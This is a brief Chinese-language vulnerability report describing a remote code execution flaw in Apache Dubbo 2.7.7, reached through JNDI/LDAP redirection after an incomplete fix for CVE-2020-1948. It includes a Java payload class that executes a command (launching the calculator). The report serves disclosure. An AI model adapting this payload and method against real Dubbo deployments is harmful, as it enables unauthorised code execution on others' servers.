# Dubbo 2.7.7 Remote Code Execute

## 版本号: 2.7.7

## poc使用JNDI的利用方式远程执行代码

## 漏洞描述:

我们发现Dubbo2.7.7存在远程代码执行漏洞，该远程代码执行漏洞是由于在修复CVE-2020-1948时的错误引起。以至于在新版本上依旧存在代码执行的问题。

## 漏洞证明详细：
    在本地新建ldap服务，将请求重定向到http服务的恶意类。
    其中恶意类为本地弹出计算器，Cals.java源码：
    ···
        import java.io.IOException;

public class Calc {
    
    public Calc() {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    public static void main(String[] args) {
        Calc e = new Calc();
    }
    
}
    ···


